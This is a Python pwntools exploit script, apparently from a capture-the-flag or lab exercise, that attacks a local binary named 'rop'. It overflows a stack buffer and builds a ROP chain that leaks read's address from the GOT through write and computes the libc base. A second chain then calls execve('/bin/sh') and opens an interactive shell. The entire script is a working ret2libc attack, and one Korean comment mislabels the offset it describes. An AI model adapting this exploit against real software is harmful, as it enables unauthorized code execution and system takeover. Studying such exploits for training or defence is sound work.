
from pwn import *
context.log_level = "info"

elf = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

gadget= 0x40117e # p gadget => 0x401176 , after function prologe  => 40117e
p = elf.process()


# 3. execve 함수 주소 (libc 내부 offset)
read_offset = libc.symbols['read']

log.info(f"read offset : {hex(read_offset)}")

padding = b"A" *0x48
payload = padding
payload += p64(gadget)
payload += p64(0x1)
payload += p64(elf.got.read)
payload += p64(0x8)
payload += p64(elf.plt.write)
payload += p64(elf.symbols.main)

p.send(payload)
p.recv(0x40)
read_address = u64(p.recv(0x8))
base_address = read_address - read_offset
libc.address = base_address

log.info("libc.read.address : " + hex(read_address))
log.info("base_add address : " +hex(base_address))

payload2 = padding
payload2 += p64(gadget)
payload2 += p64(next(libc.search(b"/bin/sh")))
payload2 += p64(0x0)
payload2 += p64(0x0)
payload2 += p64(libc.symbols["execve"])

p.send(payload2)
p.recv(0x40)

p.interactive()

